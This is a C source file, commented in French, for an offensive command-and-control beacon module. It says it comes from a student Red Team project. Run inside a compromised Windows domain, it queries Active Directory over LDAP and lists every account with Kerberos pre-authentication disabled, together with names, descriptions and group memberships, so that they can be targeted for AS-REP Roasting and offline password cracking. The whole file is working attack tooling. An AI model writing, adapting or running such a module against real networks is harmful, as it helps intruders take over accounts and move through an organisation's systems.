/*
 * ============================================================
 *  mod_adpreauth.c — Module d'énumération AS-REP Roasting (RDLL)
 *
 *  Port C natif du module .NET "PreAuthDisabledEnumerator" (PFE 2026)
 *  Cible : Comptes avec le flag DONT_REQ_PREAUTH (0x400000) activé.
 *  Objectif Red Team : Identifier les cibles pour AS-REP Roasting (T1558.002).
 * ============================================================
 */
#include "beacon.h"
#include <string.h>
#include <stdio.h>
#include <windows.h>

#ifdef RDLL_MODE

#include <winldap.h>

/* ── Extraction d'une propriété LDAP ── */
static void ad_get_prop(PLDAP ld, PLDAPMessage entry, const char *prop, char *out, size_t outsz) {
    out[0] = '\0';
    char **vals = ldap_get_values(ld, entry, (PCHAR)prop);
    if (vals && vals[0]) {
        strncpy(out, vals[0], outsz - 1);
        out[outsz - 1] = '\0';
    }
    if (vals) ldap_value_free(vals);
}

/* ── Construction du base DN ── */
static void ad_build_base_dn(const char *domain, char *out, size_t outsz) {
    out[0] = '\0';
    const char *p = domain;
    for (;;) {
        const char *dot = strchr(p, '.');
        size_t len = dot ? (size_t)(dot - p) : strlen(p);
        if (out[0] != '\0') strncat(out, ",", outsz - strlen(out) - 1);
        strncat(out, "DC=", outsz - strlen(out) - 1);
        strncat(out, p, len);
        if (!dot) break;
        p = dot + 1;
    }
}

/* ── Parsing du memberOf pour extraire les CN ── */
static void parse_member_of(PLDAP ld, PLDAPMessage entry, char *out, size_t outsz) {
    out[0] = '\0';
    char **vals = ldap_get_values(ld, entry, "memberOf");
    if (vals) {
        char temp_groups[2048] = {0};
        int count = 0;
        
        for (int i = 0; vals[i] != NULL && count < 50; i++) {
            const char *dn = vals[i];
            if (strncmp(dn, "CN=", 3) == 0 || strncmp(dn, "cn=", 3) == 0) {
                const char *comma = strchr(dn + 3, ',');
                size_t len = comma ? (size_t)(comma - (dn + 3)) : strlen(dn + 3);
                
                if (len > 0 && len < 256) {
                    char cn[256] = {0};
                    strncpy(cn, dn + 3, len);
                    
                    // Gestion des virgules échappées
                    char *esc = strstr(cn, "\\,");
                    while (esc) {
                        memmove(esc, esc + 1, strlen(esc));
                        esc = strstr(cn, "\\,");
                    }
                    
                    if (count > 0) strncat(temp_groups, ", ", sizeof(temp_groups) - strlen(temp_groups) - 1);
                    strncat(temp_groups, cn, sizeof(temp_groups) - strlen(temp_groups) - 1);
                    count++;
                }
            }
        }
        strncpy(out, temp_groups, outsz - 1);
        ldap_value_free(vals);
    }
}

/* ============================================================
 *  POINT D'ENTRÉE
 * ============================================================ */
BOF_DLL_EXPORT void go(char *args, int args_len) {
    (void)args; (void)args_len;

    char domain[256] = {0};
    DWORD sz = (DWORD)sizeof(domain);
    if (!GetComputerNameExA(ComputerNameDnsDomain, domain, &sz) || domain[0] == '\0') {
        BeaconPrintf(CALLBACK_ERROR, "[AD] Machine non jointe au domaine");
        return;
    }

    char base_dn[512];
    ad_build_base_dn(domain, base_dn, sizeof(base_dn));

    PLDAP ld = ldap_init((PCHAR)domain, LDAP_PORT);
    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR, "[AD] ldap_init echoue");
        return;
    }

    struct l_timeval timeout = { 5, 0 };
    if (ldap_connect(ld, &timeout) != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[AD] Connexion LDAP echouee");
        ldap_unbind_s(ld);
        return;
    }

    if (ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[AD] Echec de l'authentification LDAP (bind)");
        ldap_unbind_s(ld);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Domaine      : %s\n", domain);
    BeaconPrintf(CALLBACK_OUTPUT, "Recherche    : Comptes avec DONT_REQ_PREAUTH (AS-REP Roasting)\n");

    /* ── Requête LDAP avec Bitwise AND Matching Rule ── */
    /* 4194304 est la valeur décimale de 0x400000 (DONT_REQ_PREAUTH) */
    /* L'OID 1.2.840.113556.1.4.803 est le LDAP_MATCHING_RULE_BIT_AND natif de Windows */
    const char *filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(|(objectClass=user)(objectClass=computer)))";
    
    char *attrs[] = {
        "name", "sAMAccountName", "userPrincipalName", "description", "memberOf", NULL
    };

    PLDAPMessage msg = NULL;
    if (ldap_search_s(ld, (PCHAR)base_dn, LDAP_SCOPE_SUBTREE, (PCHAR)filter, attrs, 0, &msg) != LDAP_SUCCESS || !msg) {
        BeaconPrintf(CALLBACK_ERROR, "[AD] Requete PreAuth echouee (aucun compte vulnérable ou erreur LDAP)");
        ldap_unbind_s(ld);
        return;
    }

    int count = 0;
    PLDAPMessage entry;
    for (entry = ldap_first_entry(ld, msg); entry; entry = ldap_next_entry(ld, entry)) {
        char name[256], sam[256], upn[256], desc[512], groups_str[2048];

        ad_get_prop(ld, entry, "name", name, sizeof(name));
        ad_get_prop(ld, entry, "sAMAccountName", sam, sizeof(sam));
        ad_get_prop(ld, entry, "userPrincipalName", upn, sizeof(upn));
        ad_get_prop(ld, entry, "description", desc, sizeof(desc));
        parse_member_of(ld, entry, groups_str, sizeof(groups_str));

        count++;
        BeaconPrintf(CALLBACK_OUTPUT, "[%d] %s (%s)", count, name[0] ? name : sam, sam[0] ? sam : "?");
        
        if (upn[0] != '\0') {
            BeaconPrintf(CALLBACK_OUTPUT, "     UPN          : %s", upn);
        }
        if (desc[0] != '\0') {
            BeaconPrintf(CALLBACK_OUTPUT, "     Description  : %s", desc);
        }
        BeaconPrintf(CALLBACK_OUTPUT, "     Member Of    : %s\n", groups_str[0] ? groups_str : "None");
    }

    BeaconPrintf(CALLBACK_OUTPUT, "────────────────────────────────────────\nTotal        : %d compte(s) vulnérable(s) AS-REP Roasting\n", count);

    ldap_msgfree(msg);
    ldap_unbind_s(ld);
}

#else

BOF_DLL_EXPORT void go(char *args, int args_len) {
    (void)args; (void)args_len;
    BeaconPrintf(CALLBACK_ERROR, "[adpreauth] Mode BOF non supporté — utilisez -t rdll");
}

#endif /* RDLL_MODE */